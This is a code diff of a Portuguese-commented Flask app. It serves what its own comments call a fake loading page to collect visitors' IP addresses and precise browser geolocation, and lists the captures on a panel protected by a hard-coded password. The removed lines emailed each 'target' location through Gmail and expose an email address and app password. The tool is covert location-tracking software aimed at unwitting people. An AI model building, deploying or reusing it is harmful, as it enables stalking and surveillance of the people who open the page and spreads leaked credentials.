@@ -1,51 +1,17 @@
 from flask import Flask, render_template_string, request, jsonify
 import datetime
-import smtplib
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
 
 app = Flask(__name__)
 
-# Configurações de E-mail (Substitua com seu e-mail e a Senha de App do Google)
-EMAIL_REMETENTE = "guilhermekaumt01@gmail.com"
-SENHA_APP = "newd ofub cryx dvpr"  # Crie uma App Password nas configurações da sua conta Google
-EMAIL_DESTINO = "guilhermekaumt01@gmail.com"
+# Lista temporária para guardar as localizações na memória do servidor
+# (Nota: se o servidor reiniciar no Render, a lista limpa, o que é ótimo para testes)
+registros_localizacao = []
 
-def enviar_email(lat, lon, precisao, ip, agora):
-    try:
-        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-        
-        assunto = f"[ALERTA] Nova Localização Capturada - {agora}"
-        corpo = f"""
-        Nova localização capturada com sucesso!
-        
-        Data/Hora: {agora}
-        IP do Alvo: {ip}
-        Latitude: {lat}
-        Longitude: {lon}
-        Precisão: {precisao} metros
-        
-        Link do Google Maps:
-        {maps_link}
-        """
-        
-        msg = MIMEMultipart()
-        msg['From'] = EMAIL_REMETENTE
-        msg['To'] = EMAIL_DESTINO
-        msg['Subject'] = assunto
-        msg.attach(MIMEText(corpo, 'plain'))
-        
-        # Conecta no servidor SMTP do Gmail
-        servidor = smtplib.SMTP('smtp.gmail.com', 587)
-        servidor.starttls()
-        servidor.login(EMAIL_REMETENTE, SENHA_APP)
-        servidor.sendmail(EMAIL_REMETENTE, EMAIL_DESTINO, msg.as_string())
-        servidor.quit()
-        print("[+] E-mail enviado com sucesso!")
-    except Exception as e:
-        print(f"[-] Erro ao enviar e-mail: {e}")
+# Senha simples para o seu painel
+SENHA_ADMIN = "123123"
 
-HTML_PAGE = """
+# Página HTML de Captura (Falsa página de carregamento)
+HTML_CAPTURA = """
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -93,9 +59,55 @@ HTML_PAGE = """
 </html>
 """
 
+# Painel Administrativo HTML
+HTML_PAINEL = """
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Painel de Localizações</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; background: #f4f4f9; }
+        h2 { color: #333; }
+        table { width: 100%; border-collapse: collapse; background: white; margin-top: 20px; }
+        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
+        th { background: #007bff; color: white; }
+        tr:nth-child(even) { background: #f9f9f9; }
+        a { color: #007bff; text-decoration: none; font-weight: bold; }
+        a:hover { text-decoration: underline; }
+        .erro { color: red; font-weight: bold; text-align: center; }
+    </style>
+</head>
+<body>
+    <h2>Painel de Registros Capturados</h2>
+    <p>Total de capturas: {{ registros|length }}</p>
+    <table>
+        <tr>
+            <th>Data/Hora</th>
+            <th>IP</th>
+            <th>Latitude / Longitude</th>
+            <th>Precisão</th>
+            <th>Google Maps</th>
+        </tr>
+        {% for r in registros %}
+        <tr>
+            <td>{{ r.data }}</td>
+            <td>{{ r.ip }}</td>
+            <td>{{ r.lat }}, {{ r.lon }}</td>
+            <td>{{ r.precisao }} metros</td>
+            <td><a href="{{ r.maps }}" target="_blank">Abrir no Mapa</a></td>
+        </tr>
+        {% else %}
+        <tr><td colspan="5" class="erro">Nenhuma localização capturada ainda.</td></tr>
+        {% endfor %}
+    </table>
+</body>
+</html>
+"""
+
 @app.route('/')
 def index():
-    return render_template_string(HTML_PAGE)
+    return render_template_string(HTML_CAPTURA)
 
 @app.route('/salvar-loc', methods=['POST'])
 def salvar_loc():
@@ -106,18 +118,33 @@ def salvar_loc():
     
     ip_cliente = request.headers.get('X-Forwarded-For', request.remote_addr)
     agora = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
     
-    print(f"\n[!] DADOS CAPTURADOS EM {agora}")
-    print(f"IP: {ip_cliente}")
-    print(f"Latitude: {lat}")
-    print(f"Longitude: {lon}")
-    print(f"Precisão: {precisao} metros")
-    print(f"Google Maps: https://www.google.com/maps?q={lat},{lon}\n")
-    
-    # Dispara o envio do e-mail
-    enviar_email(lat, lon, precisao, ip_cliente, agora)
+    # Salva na lista da memória
+    registros_localizacao.insert(0, {
+        "data": agora,
+        "ip": ip_cliente,
+        "lat": lat,
+        "lon": lon,
+        "precisao": precisao,
+        "maps": maps_link
+    })
     
     return jsonify({"status": "sucesso"})
+
+@app.route('/admin', methods=['GET', 'POST'])
+def admin():
+    # Simples verificação de senha via parâmetro na URL: /admin?senha=123123
+    senha_informada = request.args.get('senha', '')
+    if senha_informada != SENHA_ADMIN:
+        return """
+        <body style="font-family: Arial; text-align: center; margin-top: 15%;">
+            <h2>Painel Protegido</h2>
+            <p>Acesse informando a senha na URL, por exemplo: <code>/admin?senha=SUA_SENHA</code></p>
+        </body>
+        """, 403
+        
+    return render_template_string(HTML_PAINEL, registros=registros_localizacao)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
